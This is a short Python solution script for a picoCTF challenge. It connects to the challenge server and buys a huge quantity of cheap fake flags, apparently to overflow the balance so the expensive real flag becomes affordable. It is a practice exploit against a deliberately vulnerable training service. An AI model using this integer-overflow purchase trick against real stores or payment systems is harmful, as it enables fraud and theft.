#! /usr/bin/python3

import nclib

# connect to the server
nc = nclib.Netcat(('jupiter.challenges.picoctf.org', 9745))

# we are shown the menu:
resp = nc.recv()

# if we check the balance, we have 1,100.
# the flag we *want* to buy is 100,000
# we can buy a fake flag for 900

# after running our little 'thinking' program, we know we need to purchase 
# 2386095 fake flags and then we can purchase our l33t one
nc.send_line("2") # buy a flag
resp = nc.recv() # see the 'purchase' menu
#print(resp)

nc.send_line("1") # choose the knockoff flag
resp = nc.recv() # qty prompt
#print(resp)

nc.send_line("2386095") # buy the fake flags
resp = nc.recv() # back to main menu
#print(resp)

nc.send_line("2") # ask to buy a flag
resp = nc.recv() # flag menu
#print(resp)

nc.send_line("2") # select the 1337 flag
resp = nc.recv() # see the price
#print(resp)

nc.send_line("1") # select qty 1
resp = nc.recv() # here's the gold key!
resp = nc.recv() # NOTE: need to call 2x... first time doesn't get the response
print(resp)

nc.send_line("3") # quit the program
